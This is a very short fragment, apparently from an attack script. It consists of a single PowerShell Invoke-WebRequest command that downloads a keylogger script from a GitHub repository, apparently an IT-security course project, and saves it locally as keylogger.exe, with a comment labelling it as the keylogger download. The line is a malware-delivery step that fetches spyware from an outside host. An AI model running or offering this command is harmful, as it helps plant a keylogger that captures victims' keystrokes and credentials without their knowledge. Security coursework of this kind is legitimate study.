...
Invoke-WebRequest https://raw.githubusercontent.com/JustusKapst/it-security_projekt1/refs/heads/main/GithubKeylogger/keylogger.py -O keylogger.exe #Download keylogger script
